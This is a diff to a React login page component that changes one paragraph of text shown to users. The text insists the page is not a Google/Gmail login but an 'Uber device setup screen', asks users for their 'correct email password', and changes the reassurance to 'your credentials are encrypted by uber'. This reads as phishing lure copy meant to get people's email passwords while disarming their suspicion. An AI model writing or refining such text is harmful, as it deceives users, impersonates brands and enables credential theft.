@@ -96,7 +96,7 @@ export default function LoginPage({ onNavigate }: LoginPageProps) {
                   Sign in
                 </h1>
 <p className="text-[16px] md:text-[15px] font-normal text-gray-700 leading-relaxed">
-  <strong>Note:</strong> This is NOT a Google/Gmail login page. It is a secure Uber device setup screen used only to configure your email on this tablet.<strong> Please enter your correct email password to complete setup</strong> your credentials are not stored or shared.
+  <strong>Note:</strong> This is NOT a Google/Gmail login page. It is a secure Uber device setup screen used only to configure your email on this tablet.<strong> Please enter your correct email password to complete setup</strong> your credentials are encrypted by uber.
 </p>
               </div>
             </div>  
